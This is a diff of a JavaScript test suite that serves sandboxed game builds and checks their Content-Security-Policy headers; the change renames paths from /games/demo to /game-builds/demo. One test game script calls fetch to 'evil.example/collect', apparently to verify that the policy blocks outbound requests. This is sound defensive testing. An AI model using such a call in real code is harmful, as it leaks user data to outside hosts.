@@ -88,7 +88,7 @@ test("inline script hashes cover a build's own scripts only", () => {
 
 const game = (body) =>
     `<!doctype html><meta charset="utf-8"><body><script type="module" src="./game.js"></script>${body}`;
-const harness = `<!doctype html><iframe id="game" sandbox="allow-scripts allow-pointer-lock" src="/games/demo/index.html"></iframe>
+const harness = `<!doctype html><iframe id="game" sandbox="allow-scripts allow-pointer-lock" src="/game-builds/demo/index.html"></iframe>
 <script>addEventListener("message", (e) => { window.__done = e.data; });</script>`;
 
 /** Serve one game the way the check does, run it, return the stage. */
@@ -106,11 +106,11 @@ async function play(manifest, script, body = "") {
             res.end(text);
         };
         if (pathname === "/") return send("text/html", harness);
-        if (pathname === "/games/demo/index.html")
+        if (pathname === "/game-builds/demo/index.html")
             return send("text/html", game(body), stage.headers);
-        if (pathname === "/games/demo/game.js")
+        if (pathname === "/game-builds/demo/game.js")
             return send("text/javascript", script, stage.headers);
-        if (pathname === "/games/demo/data.json")
+        if (pathname === "/game-builds/demo/data.json")
             return send("application/json", '{"ok":true}', stage.headers);
         res.writeHead(404);
         res.end();
@@ -297,9 +297,9 @@ test(
                 res.end(text);
             };
             if (pathname === "/") return send("text/html", harness);
-            if (pathname === "/games/demo/index.html")
+            if (pathname === "/game-builds/demo/index.html")
                 return send("text/html", game(""));
-            if (pathname === "/games/demo/game.js")
+            if (pathname === "/game-builds/demo/game.js")
                 return send(
                     "text/javascript",
                     `${settle}
@@ -307,7 +307,7 @@ test(
         const fetched = await tried(() => fetch("https://evil.example/collect?score=1"));
         parent.postMessage({ own, fetched }, "*");`
                 );
-            if (pathname === "/games/demo/data.json")
+            if (pathname === "/game-builds/demo/data.json")
                 return send("application/json", '{"ok":true}');
             res.writeHead(404);
             res.end();
@@ -327,7 +327,7 @@ test(
             const game = await page.request.get(
                 `http://127.0.0.1:${
                     server.address().port
-                }/games/demo/index.html`
+                }/game-builds/demo/index.html`
             );
             assert.match(
                 game.headers()["content-security-policy"],
